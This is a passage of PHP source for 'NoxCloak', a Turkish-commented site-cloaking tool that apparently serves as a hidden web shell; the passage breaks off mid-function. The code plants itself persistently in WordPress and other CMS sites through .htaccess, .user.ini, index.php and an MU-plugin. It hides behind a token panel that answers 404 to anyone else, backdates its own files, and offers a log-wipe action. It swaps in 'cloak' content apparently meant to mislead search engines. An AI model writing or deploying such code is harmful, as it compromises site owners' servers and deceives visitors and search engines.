    if (!$is_nginx) {
        $htaccess = $DIR . '/.htaccess';
        $ht_raw   = file_exists($htaccess) ? (string)@file_get_contents($htaccess) : '';
        $clean    = preg_replace('/# BEGIN NOX-CLOAK-RULE.*?# END NOX-CLOAK-RULE\n?/s', '', $ht_raw);
        $ht_ok    = (@file_put_contents($htaccess, nc_get_htaccess_rule($DIR) . "\n" . ltrim($clean)) !== false);
        $label    = strtoupper($cms);
        $fixes[]  = [$ht_ok, $ht_ok ? ".htaccess [{$label}] kuralı + auto_prepend enjekte edildi."
                                     : 'UYARI: .htaccess yazılamadı — .user.ini ve index.php katmanları devreye giriyor.'];
    }

    /* 5a - .user.ini (PHP-FPM / CGI / LiteSpeed) — .htaccess php_value çalışmayan SAPI'lar için zorunlu.
     *       mod_php'de de yazılır (zarar vermez, çift güvence sağlar). */
    {
        $fpm      = nc_is_fpm();
        $ini_ok   = nc_write_user_ini($DIR);
        $sapi_lbl = strtoupper(nc_get_sapi());
        if ($fpm) {
            $fixes[] = [$ini_ok,
                $ini_ok ? ".user.ini [{$sapi_lbl}] auto_prepend_file enjekte edildi (PHP-FPM birincil katman)."
                        : "HATA: .user.ini yazılamadı [{$sapi_lbl}] — dizin izinlerini kontrol edin."];
        } else {
            $fixes[] = [$ini_ok,
                $ini_ok ? ".user.ini auto_prepend_file eklendi (mod_php ikincil katman)."
                        : 'UYARI: .user.ini yazılamadı — mod_php için .htaccess yeterli.'];
        }
        /* PHP-FPM USR2 — .user.ini değişikliklerini anında aktif et (cache_ttl bekleme olmadan) */
        if ($fpm && $ini_ok) {
            $fpm_reloaded = false;
            if (function_exists('shell_exec')) {
                /* Bilinen PID dosya konumları */
                $pid_candidates = [
                    '/var/run/php-fpm.pid',
                    '/run/php-fpm.pid',
                    '/var/run/php/php-fpm.pid',
                    '/tmp/php-fpm.pid',
                ];
                /* PHP sürüme özel PID dosyaları (php8.2-fpm, php7.4-fpm, vs.) */
                foreach ([PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION, PHP_MAJOR_VERSION] as $_v) {
                    $pid_candidates[] = "/var/run/php/php{$_v}-fpm.pid";
                    $pid_candidates[] = "/run/php/php{$_v}-fpm.pid";
                }
                $fpm_pid = '';
                foreach ($pid_candidates as $_pf) {
                    if (file_exists($_pf)) {
                        $fpm_pid = trim((string)@file_get_contents($_pf));
                        if ($fpm_pid && ctype_digit($fpm_pid)) break;
                    }
                }
                /* Bulunamazsa shell ile dene */
                if (!$fpm_pid || !ctype_digit($fpm_pid)) {
                    $fpm_pid = trim((string)@shell_exec('cat /var/run/php*.pid /run/php*.pid 2>/dev/null | head -1'));
                }
                if ($fpm_pid && ctype_digit($fpm_pid)) {
                    @shell_exec("kill -USR2 {$fpm_pid} 2>/dev/null");
                    $fpm_reloaded = true;
                    $fixes[] = [true, "PHP-FPM USR2 sinyali gönderildi (PID: {$fpm_pid}) — .user.ini anında aktif."];
                }
            }
            if (!$fpm_reloaded) {
                $ttl = (int)@ini_get('user_ini.cache_ttl') ?: 300;
                $fixes[] = [true, "PHP-FPM .user.ini önbelleği: değişiklikler ~{$ttl}sn sonra aktif olur (USR2 gönderilemedi)."];
            }
        }
    }

    /* 5b - .htaccess yazılamazsa veya Nginx ise index.php enjeksiyonu (son katman) */
    if (!$ht_ok || $is_nginx) {
        $idx      = $DIR . '/index.php';
        $idx_html = $DIR . '/index.html';

        /* index.html + index.php birlikte varsa Apache index.html'i önce servis eder —
           index.php enjeksiyonu etkisiz kalır. Otomatik düzelt: */
        if (file_exists($idx_html) && file_exists($idx)) {
            /* Önce .htaccess'e DirectoryIndex ekle (yazılabilirse) */
            $htaccess  = $DIR . '/.htaccess';
            $ht_raw    = file_exists($htaccess) ? (string)@file_get_contents($htaccess) : '';
            $di_fixed  = false;
            if (is_writable($htaccess) || (!file_exists($htaccess) && is_writable(dirname($htaccess)))) {
                if (strpos($ht_raw, 'DirectoryIndex') === false) {
                    $di_line  = "DirectoryIndex index.php index.html\n";
                    $di_fixed = (@file_put_contents($htaccess, $di_line . $ht_raw) !== false);
                } else {
                    /* Zaten var — index.php önce mi? */
                    $di_fixed = (bool)preg_match('/DirectoryIndex\s+index\.php/i', $ht_raw);
                }
            }
            if ($di_fixed) {
                $fixes[] = [true, '.htaccess: DirectoryIndex index.php önceliklendirildi (index.html çakışması giderildi).'];
            } else {
                /* .htaccess yazılamıyorsa index.html'i yeniden adlandır */
                $bak = $idx_html . '.nox-bak';
                if (@rename($idx_html, $bak)) {
                    $fixes[] = [true, 'index.html → index.html.nox-bak olarak yeniden adlandırıldı (index.php önceliği sağlandı).'];
                } else {
                    $fixes[] = [false, 'UYARI: index.html ve index.php çakışıyor — index.html silinemedi/yeniden adlandırılamadı. Manuel kaldırın.'];
                }
            }
        }

        if (file_exists($idx) && is_writable($idx)) {
            $inject_result = nc_inject_index_php($DIR);
            if ($inject_result === 'exists') {
                $fixes[] = [true, 'index.php: NoxCloak zaten enjekte edilmiş.'];
            } elseif ($inject_result === true) {
                $fixes[] = [true, 'index.php başına NoxCloak require eklendi (htaccess yedekleme katmanı).'];
            } else {
                $fixes[] = [false, 'HATA: index.php de yazılamadı — manuel enjeksiyon gerekli.'];
            }
        } elseif (!file_exists($idx)) {
            $fixes[] = [false, 'HATA: index.php bulunamadı — .htaccess veya manuel require gerekli.'];
        } else {
            $fixes[] = [false, 'UYARI: index.php yazılamıyor — chmod 644 index.php uygulayın.'];
        }
    } elseif ($ht_ok) {
        /* htaccess başarılıysa index.php'deki eski NoxCloak satırını temizle */
        nc_remove_index_inject($DIR);
    }

    /* 6 - CMS'e özel ek enjeksiyon */
    switch ($cms) {
        case 'wordpress':
            // MU-Plugin: WP cache sistemi mod_rewrite'ı bypass edebilir; bu katman her koşulda çalışır
            $mu_dir = $DIR . '/wp-content/mu-plugins';
            if (!is_dir($mu_dir)) @mkdir($mu_dir, 0755, true);
            $ok      = (@file_put_contents($mu_dir . '/nox-engine.php', nc_get_mu_plugin_code($DIR)) !== false);
            $fixes[] = [$ok, $ok ? 'WordPress MU-Plugin (nox-engine.php) güncellendi.'
                                 : 'HATA: MU-Plugin yazılamadı.'];
            // Kök URL statik cache dosyalarını sil (WP Super Cache, WP Fastest Cache, WP Rocket, vs.)
            $purged = nc_wp_purge_root_cache($DIR);
            $fixes[] = [true, "WordPress kök URL cache dosyaları temizlendi ({$purged} dosya)."];

            // WP transient + rewrite_rules — doğrudan SQL (wp-load.php yüklenmez — hızlı ve güvenli)
            $_wc_cfg_path = nc_find_wpconfig($DIR);
            if ($_wc_cfg_path) {
                $_wc_cfg = nc_parse_wpconfig($_wc_cfg_path);
                if (!empty($_wc_cfg['creds']['DB_NAME'])) {
                    $_wc_db = nc_db_connect($_wc_cfg['creds']);
                    if ($_wc_db) {
                        $_wpfx  = $_wc_cfg['prefix'];
                        $_wc_tr = @$_wc_db->query(
                            "DELETE FROM `{$_wpfx}options` WHERE option_name LIKE '\\_transient\\_%' OR option_name LIKE '\\_site\\_transient\\_%'"
                        );
                        $_wc_del = ($_wc_tr !== false) ? (int)$_wc_db->affected_rows : 0;
                        @$_wc_db->query("DELETE FROM `{$_wpfx}options` WHERE option_name='rewrite_rules'");
                        $_wc_db->close();
                        $fixes[] = [true, "WP transient + rewrite_rules SQL ile temizlendi ({$_wc_del} kayıt)."];
                    } else {
                        $fixes[] = [true, 'WP transient: DB bağlantısı kurulamadı (atlandı).'];
                    }
                }
            }

            // LiteSpeed sunucu seviyesi cache purge (LSCWP plugin gerekmez)
            if (function_exists('curl_init')) {
                $_ls_srv = strtolower(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '');
                if (strpos($_ls_srv, 'litespeed') !== false || strpos($_ls_srv, 'lsws') !== false) {
                    $_ls_scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                    $_ls_ch = curl_init($_ls_scheme . '://' . $_SERVER['HTTP_HOST'] . '/');
                    curl_setopt_array($_ls_ch, [
                        CURLOPT_CUSTOMREQUEST  => 'PURGE',
                        CURLOPT_HTTPHEADER     => ['X-LiteSpeed-Purge: *'],
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_NOBODY         => true,
                        CURLOPT_CONNECTTIMEOUT => 3,
                        CURLOPT_TIMEOUT        => 5,
                        CURLOPT_SSL_VERIFYPEER => false,
                    ]);
                    curl_exec($_ls_ch);
                    $_ls_code = (int)curl_getinfo($_ls_ch, CURLINFO_HTTP_CODE);
                    curl_close($_ls_ch);
                    $fixes[] = [true, "LiteSpeed HTTP PURGE gönderildi (HTTP {$_ls_code})."];
                }
            }

            // Managed host API purge (WP Engine, Kinsta, Pantheon, Cloudways)
            $_mh = [];
            if (class_exists('WpeCommon')) {
                try { if (method_exists('WpeCommon','purge_varnish_cache')) @WpeCommon::purge_varnish_cache(); } catch(Exception $_e) {}
                try { if (method_exists('WpeCommon','purge_memcached'))     @WpeCommon::purge_memcached(); }     catch(Exception $_e) {}
                $_mh[] = 'WP Engine';
            }
            if (class_exists('Kinsta\\Cache') && method_exists('Kinsta\\Cache','purge_complete_caches')) {
                try { $_ki = new Kinsta\Cache(); @$_ki->purge_complete_caches(); } catch(Exception $_e) {}
                $_mh[] = 'Kinsta';
            }
            if (function_exists('pantheon_clear_edge_all')) {
                try { @pantheon_clear_edge_all(); } catch(Exception $_e) {}
                $_mh[] = 'Pantheon';
            }
            if (function_exists('do_action') && defined('BREEZE_VERSION')) {
                @do_action('breeze_clear_all_cache');
                $_mh[] = 'Cloudways/Breeze';
            }
            if (!empty($_mh)) $fixes[] = [true, 'Managed host cache temizlendi: ' . implode(', ', $_mh) . '.'];

            break;

        case 'joomla':
            // Joomla: configuration.php'de auto_prepend ayarlanamazsa .htaccess yeterli
            // Cache klasörlerinin var olup olmadığını kontrol et
            foreach ([$DIR.'/cache', $DIR.'/administrator/cache'] as $cDir) {
                if (!is_dir($cDir)) @mkdir($cDir, 0755, true);
            }
            $fixes[] = [true, 'Joomla cache dizinleri doğrulandı.'];
            break;

        case 'drupal':
            // Drupal: settings.php'de auto_prepend zorlanamaz; .htaccess + auto_prepend yeterli
            $sites_files = $DIR . '/sites/default/files';
            if (!is_writable($sites_files) && is_dir($sites_files)) {
                @chmod($sites_files, 0755);
            }
            $fixes[] = [true, 'Drupal sites/default/files izni doğrulandı.'];
            break;

        case 'laravel':
            // Bootstrap/cache yoksa oluştur
            $bsCache = $appRoot . '/bootstrap/cache';
            if (!is_dir($bsCache)) @mkdir($bsCache, 0775, true);
            // storage/framework altını doğrula
            foreach (['cache','views','sessions'] as $sub) {
                $d = $appRoot . '/storage/framework/' . $sub;
                if (!is_dir($d)) @mkdir($d, 0775, true);
            }
            $fixes[] = [true, 'Laravel storage/bootstrap dizinleri doğrulandı.'];
            break;

        case 'prestashop':
            // var/cache yoksa oluştur
            $psCache = $DIR . '/var/cache';
            if (!is_dir($psCache)) @mkdir($psCache, 0755, true);
            $fixes[] = [true, 'PrestaShop var/cache dizini doğrulandı.'];
            break;

        case 'magento':
            // var/cache yoksa oluştur
            foreach (['var/cache','var/page_cache','var/full_page_cache'] as $sub) {
                $d = $appRoot . '/' . $sub;
                if (!is_dir($d)) @mkdir($d, 0755, true);
            }
            $fixes[] = [true, 'Magento var/cache dizinleri doğrulandı.'];
            break;

        case 'symfony':
            $sfCache = $appRoot . '/var/cache';
            if (!is_dir($sfCache)) @mkdir($sfCache, 0755, true);
            $fixes[] = [true, 'Symfony var/cache dizini doğrulandı.'];
            break;

        case 'opencart':
            foreach ([$DIR.'/system/storage/cache',$DIR.'/system/cache'] as $d) {
                if (!is_dir($d)) @mkdir($d, 0755, true);
            }
            $fixes[] = [true, 'OpenCart cache dizinleri doğrulandı.'];
            break;

        case 'whmcs':
            foreach ([$DIR.'/templates_c',$DIR.'/storage/cache'] as $d) {
                if (!is_dir($d)) @mkdir($d, 0755, true);
            }
            $fixes[] = [true, 'WHMCS cache dizinleri doğrulandı.'];
            break;

        case 'codeigniter':
            foreach ([$DIR.'/application/cache',$DIR.'/writable/cache'] as $d) {
                if (!is_dir($d)) @mkdir($d, 0755, true);
            }
            $fixes[] = [true, 'CodeIgniter cache dizinleri doğrulandı.'];
            break;
    }

    /* 7 - tüm CMS cache'lerini temizle */
    $deleted = nc_purge_all_caches($DIR);
    $fixes[] = [true, "Tüm [{$cms}] önbellekleri temizlendi ({$deleted} dosya)."];

    /* 8 - owner_ip */
    $owner_ip_file = $rcDir . '/.owner_ip';
    if (!file_exists($owner_ip_file)) {
        @file_put_contents($owner_ip_file, nc_get_client_ip());
        $fixes[] = [true, 'Owner IP dosyası oluşturuldu.'];
    }

    @clearstatcache(true);
    /* OPcache temizle — değiştirilen dosyalar anında aktif olsun */
    if (function_exists('opcache_reset')) @opcache_reset();
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate($cloak_php, true);
        @opcache_invalidate($DIR . '/index.php', true);
    }
    return $fixes;
}

/* ==================== BAŞLANGIÇ KURULUMU ==================== */

/*
 * $DIR — CMS kök dizini.
 * Önce DOCUMENT_ROOT denenir. Eğer DOCUMENT_ROOT'ta CMS tespit edilemezse
 * dosyanın bulunduğu dizinden yukarı doğru taranır ve CMS bulunan dizin kullanılır.
 * Bu sayede dosya subdirectory'e yüklenmiş veya DOCUMENT_ROOT yanlış ayarlı olsa da çalışır.
 */
(function () {
    global $DIR;
    $dr = rtrim(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '', '/\\');
    // DOCUMENT_ROOT'ta CMS var mı?
    if ($dr && nc_detect_cms_single($dr) !== '') {
        $DIR = $dr;
        return;
    }
    // Dosyanın dizininden yukarı tara
    $walk = rtrim(dirname(__FILE__), '/\\');
    for ($i = 0; $i < 6; $i++) {
        if (nc_detect_cms_single($walk) !== '') {
            $DIR = $walk;
            return;
        }
        $parent = dirname($walk);
        if ($parent === $walk) break;
        $walk = $parent;
    }
    // Hiçbiri eşleşmedi → DOCUMENT_ROOT veya dosyanın dizini
    $DIR = $dr ?: rtrim(dirname(__FILE__), '/\\');
})();

$rcDir_init  = nc_content_dir($DIR);
if (!is_dir($rcDir_init)) @mkdir($rcDir_init, 0755, true);

$owner_ip_file = $rcDir_init . DIRECTORY_SEPARATOR . '.owner_ip';
if (!file_exists($owner_ip_file)) {
    @file_put_contents($owner_ip_file, nc_get_client_ip());
}

$default_html = '<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, follow">
<title>NOX SHELL</title>
<style>
  :root {
    --bg:#060608;--surface:#0F0F12;--border:#1C1C22;--gold:#B8925A;--gold-hi:#D4AD70;
    --text:#E8E4DC;--text-mid:#807C76;--text-dim:#28282E;
    --mono:"Cascadia Code","SF Mono",Consolas,"Courier New",monospace;
  }
  *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;
    display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
  body::before{content:"";position:fixed;inset:0;
    background-image:radial-gradient(circle,var(--text-dim) 1px,transparent 1px);
    background-size:28px 28px;pointer-events:none}
  body::after{content:"";position:fixed;inset:0;
    background:radial-gradient(ellipse 70% 70% at 50% 50%,transparent 20%,var(--bg) 100%);pointer-events:none}
  .shell{position:relative;z-index:1;text-align:center;padding:4rem 3rem;width:100%;
    max-width:640px;display:flex;flex-direction:column;align-items:center;gap:0}
  .eyebrow{font-size:.6rem;letter-spacing:.45em;text-transform:uppercase;color:var(--gold);
    display:flex;align-items:center;gap:1.25rem;margin-bottom:2.75rem}
  .eyebrow::before,.eyebrow::after{content:"";display:block;width:36px;height:1px;
    background:var(--gold);opacity:.45}
  h1{font-size:clamp(5rem,18vw,8.5rem);font-weight:200;letter-spacing:.3em;text-transform:uppercase;
    color:var(--text);line-height:1;text-indent:.3em;margin-bottom:.6rem}
  .sub{font-size:.6rem;letter-spacing:.55em;text-transform:uppercase;color:var(--text-mid);
    text-indent:.55em;margin-bottom:3rem}
  .stem{width:1px;height:56px;background:linear-gradient(to bottom,var(--gold),transparent);margin-bottom:3rem}
  .status{display:flex;align-items:center;justify-content:center;gap:.875rem;
    font-size:.6rem;letter-spacing:.28em;text-transform:uppercase;color:var(--text-mid)}
  .dot{width:5px;height:5px;border-radius:50%;background:var(--gold);flex-shrink:0;
    animation:pulse 2.4s ease-in-out infinite}
  .cursor{display:inline-block;width:7px;height:.9em;background:var(--gold);vertical-align:middle;
    margin-left:.15em;animation:blink 1.1s step-end infinite}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
</style>
</head>
<body>
<main class="shell">
  <div class="eyebrow">SEO TEST</div>
  <h1>NOX</h1>
  <div class="sub">Shell &nbsp;/&nbsp; System</div>
  <div class="stem"></div>
  <div class="status">
    <span class="dot"></span>
    <span>Active</span>
    <span class="cursor"></span>
  </div>
</main>
</body>
</html>';

$perde_init_path = nc_content_dir($DIR) . DIRECTORY_SEPARATOR . 'perde.html';
if (!file_exists($perde_init_path)) {
    @file_put_contents($perde_init_path, $default_html);
}

/* İLK KURULUM */
if ($stored_hash === '') {
    $raw_token = bin2hex(nc_safe_rand_bytes(16));
    $new_hash  = hash('sha256', $raw_token);
    if (@file_put_contents($meta_file, $new_hash) !== false) {
        @touch($meta_file, @filemtime(__FILE__));
        $scheme   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $full_url = $scheme . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?p=' . rawurlencode($raw_token);
        while (ob_get_level() > 0) ob_end_clean();
        echo '<!DOCTYPE html><html lang="tr"><head><meta charset="utf-8">'
            . '<title>NoxCloak — Kurulum</title>'
            . '<style>'
            . '*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}'
            . 'body{'
            .   'background:#07090e;color:#c9d1d9;font-family:monospace;'
            .   'display:flex;align-items:center;justify-content:center;'
            .   'min-height:100vh;padding:24px;position:relative;overflow:hidden;'
            . '}'
            /* noktalı grid */
            . 'body::before{'
            .   'content:"";position:fixed;inset:0;'
            .   'background-image:radial-gradient(circle,#151c27 1px,transparent 1px);'
            .   'background-size:28px 28px;pointer-events:none;'
            . '}'
            /* vignette */
            . 'body::after{'
            .   'content:"";position:fixed;inset:0;'
            .   'background:radial-gradient(ellipse 70% 70% at 50% 50%,transparent 20%,rgba(4,5,8,.8) 100%);'
            .   'pointer-events:none;'
            . '}'
            /* büyük NOX watermark */
            . '.nox-bg{'
            .   'position:fixed;inset:0;display:flex;align-items:center;justify-content:center;'
            .   'pointer-events:none;overflow:hidden;'
            . '}'
            . '.nox-bg-text{'
            .   'font-size:38vw;font-weight:200;letter-spacing:.3em;'
            .   'color:rgba(21,28,39,0.7);text-transform:uppercase;user-select:none;line-height:1;'
            . '}'
            . '.box{'
            .   'background:rgba(13,18,26,0.92);'
            .   'border:1px solid rgba(184,146,90,.2);'
            .   'border-radius:8px;padding:30px 28px;max-width:520px;width:100%;'
            .   'position:relative;z-index:1;'
            .   'box-shadow:0 0 60px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.03) inset;'
            . '}'
            /* ince gold çizgi üstte */
            . '.box::before{'
            .   'content:"";display:block;height:1px;'
            .   'background:linear-gradient(90deg,transparent,rgba(184,146,90,.5),transparent);'
            .   'margin-bottom:22px;'
            . '}'
            . '.eyebrow{'
            .   'font-size:9px;letter-spacing:.5em;text-transform:uppercase;'
            .   'color:rgba(184,146,90,.7);margin-bottom:6px;'
            . '}'
            . 'h2{color:#e8e4dc;font-size:15px;font-weight:bold;margin-bottom:16px;letter-spacing:.03em}'
            . 'p{font-size:11px;color:#6b7788;line-height:1.6;margin:6px 0}'
            . '.url{'
            .   'background:rgba(7,9,14,.8);border:1px solid #1e242d;'
            .   'padding:10px 12px;border-radius:4px;word-break:break-all;'
            .   'color:#58a6ff;font-size:11px;margin:14px 0;line-height:1.5;'
            . '}'
            . '.actions{display:flex;gap:8px;margin-top:4px;flex-wrap:wrap}'
            . '.btn{'
            .   'background:rgba(184,146,90,.12);color:#b8925a;'
            .   'border:1px solid rgba(184,146,90,.25);'
            .   'padding:7px 16px;border-radius:4px;font-weight:bold;'
            .   'cursor:pointer;font-family:monospace;font-size:11px;letter-spacing:.04em;'
            .   'transition:.15s;'
            . '}'
            . '.btn:hover{background:rgba(184,146,90,.2);border-color:rgba(184,146,90,.45);color:#d4ad70}'
            . '.warn{font-size:10px;color:rgba(184,146,90,.5);margin-top:16px;line-height:1.5}'
            . '.nox-mark{'
            .   'position:fixed;bottom:16px;right:20px;'
            .   'font-size:9px;letter-spacing:.5em;color:rgba(184,146,90,.08);'
            .   'pointer-events:none;user-select:none;'
            . '}'
            . '</style></head><body>'
            . '<div class="nox-bg"><span class="nox-bg-text">NOX</span></div>'
            . '<div class="nox-mark">NOX</div>'
            . '<div class="box">'
            .   '<div class="eyebrow">NoxCloak v33</div>'
            .   '<h2>İlk Kurulum Tamamlandı</h2>'
            .   '<p>Güvenlik token\'ınız oluşturuldu. Aşağıdaki URL\'yi kaydedin — <b>bir daha gösterilmeyecek.</b></p>'
            .   '<div class="url" id="tokenurl">' . htmlspecialchars($full_url, ENT_QUOTES, 'UTF-8') . '</div>'
            .   '<div class="actions">'
            .     '<button class="btn" onclick="navigator.clipboard.writeText(document.getElementById(\'tokenurl\').innerText).then(()=>{this.innerText=\'✓ Kopyalandı\';setTimeout(()=>this.innerText=\'KOPYALA\',2000)})">KOPYALA</button>'
            .     '<button class="btn" onclick="window.open(document.getElementById(\'tokenurl\').innerText,\'_blank\')">PANELE GİT ↗</button>'
            .   '</div>'
            .   '<p class="warn">⚠ Bu URL\'yi tarayıcı geçmişinde bırakmamak için panele girdikten sonra sekmeyi kapatın.</p>'
            . '</div>'
            . '</body></html>';
        exit;
    } else {
        /* Meta dosyası yazılamadı — dizin izin hatası, sessiz 404 yerine açıklayıcı ekran */
        while (ob_get_level() > 0) ob_end_clean();
        $meta_dir  = dirname($meta_file);
        $meta_name = basename($meta_file);
        echo '<!DOCTYPE html><html lang="tr"><head><meta charset="utf-8"><title>NoxCloak — İzin Hatası</title>'
            . '<style>*{margin:0;padding:0;box-sizing:border-box}'
            . 'body{background:#07090e;color:#c9d1d9;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}'
            . '.box{background:rgba(13,18,26,.95);border:1px solid rgba(248,81,73,.3);border-radius:8px;padding:30px 28px;max-width:540px;width:100%}'
            . 'h2{color:#f85149;font-size:14px;margin-bottom:16px}'
            . 'p{font-size:11px;color:#8b949e;line-height:1.7;margin:6px 0}'
            . 'code{background:#0d1117;border:1px solid #21262d;padding:2px 6px;border-radius:3px;color:#58a6ff;font-size:11px}'
            . '.cmd{background:#0d1117;border:1px solid #21262d;border-radius:4px;padding:10px 12px;margin:10px 0;color:#3fb950;font-size:11px;word-break:break-all}'
            . '</style></head><body><div class="box">'
            . '<h2>⚠ NoxCloak — Dizin Yazma İzni Yok</h2>'
            . '<p>Token dosyası <code>' . htmlspecialchars($meta_name, ENT_QUOTES, 'UTF-8') . '</code> şu dizine yazılamadı:</p>'
            . '<div class="cmd">' . htmlspecialchars($meta_dir, ENT_QUOTES, 'UTF-8') . '</div>'
            . '<p>SSH veya hosting panelinden aşağıdaki komutu çalıştırın:</p>'
            . '<div class="cmd">chmod 755 ' . htmlspecialchars($meta_dir, ENT_QUOTES, 'UTF-8') . '</div>'
            . '<p>Sonra bu sayfayı yenileyin — token otomatik oluşturulacak.</p>'
            . '</div></body></html>';
        exit;
    }
}

/* TOKEN DOĞRULAMA */
$provided_p = isset($_GET['p'])  ? (string)$_GET['p']
            : (isset($_POST['p']) ? (string)$_POST['p'] : '');
if (!hash_equals($stored_hash, hash('sha256', $provided_p))) {
    while (ob_get_level() > 0) ob_end_clean();
    if (!headers_sent()) { header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found', true, 404); }
    exit;
}

$action = isset($_POST['a']) ? $_POST['a'] : (isset($_GET['a']) ? $_GET['a'] : '');

/* ==================== AJAX İŞLEYİCİLERİ ==================== */

/* view_perde — HTML çıktısından ÖNCE işleniyor */
if ($action === 'view_perde') {
    $vp_path = nc_content_dir($DIR) . '/perde.html';
    while (ob_get_level() > 0) ob_end_clean();
    if (file_exists($vp_path)) {
        header('Content-Type: text/html; charset=utf-8');
        readfile($vp_path);
    } else {
        header('Content-Type: text/plain; charset=utf-8');
        echo 'Perde dosyası henüz oluşturulmamış.';
    }
    exit;
}

/* status — active + perde_ok + cms döndürüyor */
if ($action === 'status') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $rcDir     = nc_content_dir($DIR);
    $lock_file = $rcDir . '/cloak.lock';
    $perde_f   = $rcDir . '/perde.html';
    echo json_encode([
        'active'   => file_exists($lock_file),
        'paused'   => file_exists($rcDir . '/.nox-paused'),
        'perde_ok' => file_exists($perde_f) && filesize($perde_f) > 50,
        'cms'      => nc_detect_cms($DIR),
        'ip'       => nc_get_client_ip(),
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

/* auto_fix — çift purge yok, log var */
if ($action === 'auto_fix') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $fixes = nc_smart_fix($DIR);
    $msgs  = array_column($fixes, 1);
    nc_write_log('Otomatik Onarım', implode(' | ', $msgs));
    echo json_encode(['success' => true, 'msg' => implode("\n", $msgs), 'fixes' => $fixes], JSON_UNESCAPED_UNICODE);
    exit;
}

/* ==================== LOG SIFIRLAMA ==================== */
if ($action === 'clear_logs') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    /* Şifre yalnızca hash olarak karşılaştırılır — plaintext kodda saklanmaz */
    define('NC_LOG_PASS_HASH', '0510dd5c289268b97cda656da6d8b4fc81623462c73e596fe74d7be49bb82b1b');
    $submitted = isset($_POST['pass']) ? trim($_POST['pass']) : '';
    if (hash('sha256', $submitted) !== NC_LOG_PASS_HASH) {
        echo json_encode(['success' => false, 'msg' => 'Hatalı şifre.'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    $log_file = nc_content_dir($DIR) . '/audit.log';
    if (!file_exists($log_file)) {
        echo json_encode(['success' => true, 'msg' => 'Log zaten boş.'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    $cleared = @file_put_contents($log_file, '');
    if ($cleared !== false) {
        echo json_encode(['success' => true, 'msg' => 'Loglar temizlendi.'], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'msg' => 'Dosya silinemedi — yazma izni?'], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

if ($action === 'get_logs') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $log_file  = nc_content_dir($DIR) . '/audit.log';
    $owner_ip  = file_exists(nc_content_dir($DIR) . '/.owner_ip')
                 ? trim((string)file_get_contents(nc_content_dir($DIR) . '/.owner_ip')) : '';
    $logs      = [];
    if (file_exists($log_file)) {
        $lines = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $lines = array_reverse($lines);
        foreach (array_slice($lines, 0, 50) as $line) {
            $d = json_decode($line, true);
            if ($d) {
                if (!isset($d['type'])) $d['type'] = ($d['ip'] === $owner_ip) ? 'owner' : 'visitor';
                $logs[] = $d;
            }
        }
    }
    echo json_encode(['logs' => $logs], JSON_UNESCAPED_UNICODE);
    exit;
}

/* toggle_cloak — yanıtta active alanı var */
if ($action === 'toggle_cloak') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $rcDir        = nc_content_dir($DIR);
    $lock_file    = $rcDir . '/cloak.lock';
    $content_file = $rcDir . '/perde.html';
    $htaccess_p   = $DIR . '/.htaccess';
    $mu_file      = $DIR . '/wp-content/mu-plugins/nox-engine.php';

    $paused_flag = $rcDir . '/.nox-paused';

    if (!file_exists($content_file)) {
        global $default_html;
        @file_put_contents($content_file, $default_html);
    }

    if (file_exists($lock_file)) {
        /* KAPATIYOR — kasıtlı kapatma bayrağını yaz */
        @unlink($lock_file);
        @file_put_contents($paused_flag, '1');
        if (file_exists($htaccess_p)) {
            $ht    = (string)@file_get_contents($htaccess_p);
            $clean = preg_replace('/# BEGIN NOX-CLOAK-RULE.*?# END NOX-CLOAK-RULE\n?/s', '', $ht);
            @file_put_contents($htaccess_p, $clean);
        }
        if (file_exists($mu_file)) @unlink($mu_file);
        /* .user.ini auto_prepend satırını kaldır */
        nc_remove_user_ini($DIR);
        /* Bot test önbelleğini geçersiz kıl */
        @unlink($rcDir . '/.bottest_cache');
        /* Sayfa önbelleklerini temizle (OPcache + CMS cache) */
        nc_purge_all_caches($DIR);
        nc_write_log('Cloak Kapatıldı', 'Sistem kasıtlı olarak pasife alındı (.nox-paused). Önbellekler temizlendi.');
        echo json_encode(['success' => true, 'active' => false, 'paused' => true, 'msg' => 'Cloak kapatıldı. Önbellekler temizlendi. Google Zengin Sonuçlar testi CDN önbelleği varsa 1-5 dk içinde güncellenir.'], JSON_UNESCAPED_UNICODE);
    } else {
        /* AÇIYOR — kasıtlı kapatma bayrağını sil */
        if (!@unlink($paused_flag) && file_exists($paused_flag)) {
            /* unlink başarısız oldu — chmod ile izin düzelt ve tekrar dene */
            @chmod($paused_flag, 0644);
            @unlink($paused_flag);
        }
        @unlink($rcDir . '/.bottest_cache');
        nc_smart_fix($DIR);
